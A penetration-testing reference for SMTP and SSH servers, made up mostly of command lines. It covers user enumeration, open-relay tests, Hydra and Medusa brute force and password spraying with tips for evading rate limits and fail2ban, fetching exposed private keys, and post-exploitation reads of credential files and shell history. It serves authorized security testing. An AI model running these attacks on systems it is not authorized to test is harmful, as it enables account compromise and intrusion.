# Protocol Penetration Testing

> Sources: smtp-penetration-testing, ssh-penetration-testing skills

---

# Part 1: SMTP Penetration Testing

## Purpose

Conduct comprehensive security assessments of SMTP servers to identify open relays, user enumeration, weak authentication, and misconfiguration.

## SMTP Architecture

```
Components: MTA (transfer) > MDA (delivery) > MUA (client)
Ports: 25 (SMTP), 465 (SMTPS), 587 (submission), 2525 (alternative)
Workflow: Sender MUA > Sender MTA > DNS/MX > Recipient MTA > MDA > Recipient MUA
```

## Phase 1: Service Discovery

```bash
nmap -p 25,465,587,2525 -sV TARGET_IP
nmap -sV -sC -p 25 TARGET_IP
nmap --script=smtp-* -p 25 TARGET_IP

# MX record discovery
dig MX target.com
nslookup -type=mx target.com
host -t mx target.com
```

## Phase 2: Banner Grabbing

```bash
telnet TARGET_IP 25
nc TARGET_IP 25
nmap -sV -p 25 TARGET_IP

# Manual SMTP commands
EHLO test
# Response reveals server software, version, supported extensions
```

## Phase 3: User Enumeration

```bash
# smtp-user-enum methods
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP
smtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP
smtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com

# Nmap
nmap --script smtp-enum-users -p 25 TARGET_IP
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP

# Metasploit
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```

## Phase 4: Open Relay Testing

```bash
# Nmap
nmap -p 25 --script smtp-open-relay TARGET_IP

# Manual test via Telnet
telnet TARGET_IP 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external-domain.com>
DATA
Subject: Relay Test
This is a test.
.
QUIT
# If accepted (250 OK), server is open relay

# Metasploit
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS TARGET_IP
run
```

## Phase 5: Brute Force Authentication

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP
hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp
hydra -L users.txt -P passwords.txt TARGET_IP smtp

# Medusa
medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp

# Metasploit
use auxiliary/scanner/smtp/smtp_login
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
run
```

## Phase 6: TLS/SSL & Email Auth Testing

```bash
# STARTTLS
openssl s_client -connect TARGET_IP:25 -starttls smtp
# Direct SSL
openssl s_client -connect TARGET_IP:465
# Cipher enumeration
nmap --script ssl-enum-ciphers -p 25 TARGET_IP

# SPF/DKIM/DMARC
dig TXT target.com | grep spf
dig TXT selector._domainkey.target.com
dig TXT _dmarc.target.com
```

## SMTP Quick Reference

### Essential Commands

| Command | Purpose |
|---------|---------|
| HELO/EHLO | Identify client |
| MAIL FROM | Set sender |
| RCPT TO | Set recipient |
| DATA | Start message body |
| VRFY | Verify user |
| EXPN | Expand alias |
| QUIT | End session |

### Response Codes

| Code | Meaning |
|------|---------|
| 220 | Service ready |
| 250 | OK / Action completed |
| 354 | Start mail input |
| 421 | Service not available |
| 550 | User unknown |

### Common Vulnerabilities

| Vulnerability | Risk | Test Method |
|--------------|------|-------------|
| Open Relay | High | Relay test with external recipient |
| User Enumeration | Medium | VRFY/EXPN/RCPT commands |
| Weak Auth | High | Brute force attack |
| No TLS | Medium | STARTTLS test |
| Missing SPF/DKIM | Medium | DNS record lookup |

---

# Part 2: SSH Penetration Testing

## Purpose

Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling, and post-exploitation.

## Phase 1: Service Discovery

```bash
nmap -p 22 192.168.1.0/24 --open
nmap -p 22,2222,22222,2200 192.168.1.100
nmap -p- --open 192.168.1.100 | grep -i ssh
nmap -sV -p 22 192.168.1.100
```

### Common SSH Ports

| Port | Description |
|------|-------------|
| 22 | Default SSH |
| 2222 | Common alternate |
| 22222 | Another alternate |
| 830 | NETCONF over SSH |

## Phase 2: Enumeration

```bash
# Banner grabbing
nc 192.168.1.100 22

# Nmap scripts
nmap -sV -p 22 --script ssh-hostkey 192.168.1.100
nmap -p 22 --script ssh2-enum-algos 192.168.1.100
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100

# Comprehensive audit
ssh-audit 192.168.1.100
```

## Phase 3: Credential Attacks

### Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100  # Rate limit evasion
hydra -l admin -P passwords.txt -f ssh://192.168.1.100           # Stop on first success
```

### Medusa

```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
medusa -H targets.txt -u admin -P passwords.txt -M ssh
```

### Password Spraying

```bash
hydra -L users.txt -p Summer2024! ssh://192.168.1.100
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://192.168.1.100
done
```

## Phase 4: Key-Based Authentication Testing

```bash
ssh -i id_rsa user@192.168.1.100
ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100
ssh -o PreferredAuthentications=password user@192.168.1.100

# Check for exposed keys
curl -s http://target.com/.ssh/id_rsa
curl -s http://target.com/id_rsa
```

## Phase 5: SSH Tunneling & Port Forwarding

| Type | Command | Use Case |
|------|---------|----------|
| Local | `ssh -L 8080:target:80 user@host` | Access remote services locally |
| Remote | `ssh -R 8080:localhost:80 user@host` | Expose local services remotely |
| Dynamic | `ssh -D 1080 user@host` | SOCKS proxy for pivoting |

```bash
# Local port forwarding
ssh -L 8080:192.168.1.50:80 user@192.168.1.100

# Remote port forwarding
ssh -R 8080:localhost:80 user@192.168.1.100

# SOCKS proxy
ssh -D 1080 user@192.168.1.100
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn 192.168.1.0/24

# Jump hosts
ssh -J user1@jump_host user2@target_host
ssh -J user1@jump1,user2@jump2 user3@target
```

## Phase 6: Post-Exploitation

```bash
sudo -l
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
ls -la ~/.ssh/
cat /etc/ssh/sshd_config
cat /etc/passwd | grep -v nologin
cat ~/.bash_history | grep -i ssh
cat ~/.bash_history | grep -i pass
```

## Phase 7: Metasploit SSH Modules

```bash
use auxiliary/scanner/ssh/ssh_version        # Version scanning
use auxiliary/scanner/ssh/ssh_login          # Brute force
use auxiliary/scanner/ssh/ssh_login_pubkey   # Key-based login
use auxiliary/scanner/ssh/ssh_enumusers      # Username enumeration
```

## SSH Brute-Force Tool Comparison

| Tool | Command |
|------|---------|
| Hydra | `hydra -l user -P pass.txt ssh://host` |
| Medusa | `medusa -h host -u user -P pass.txt -M ssh` |
| Ncrack | `ncrack -p 22 --user admin -P pass.txt host` |
| Metasploit | `use auxiliary/scanner/ssh/ssh_login` |

## Troubleshooting

| Issue | Solutions |
|-------|-----------| 
| Connection Refused | Verify SSH running; check firewall; confirm port |
| Authentication Failures | Verify username; check password policy; key permissions (600) |
| Tunnel Not Working | Check GatewayPorts/AllowTcpForwarding in sshd_config; use `ssh -v` |
| Brute Force Blocked | Slow down (`-t 1 -w 5`); distribute across IPs; check for fail2ban |
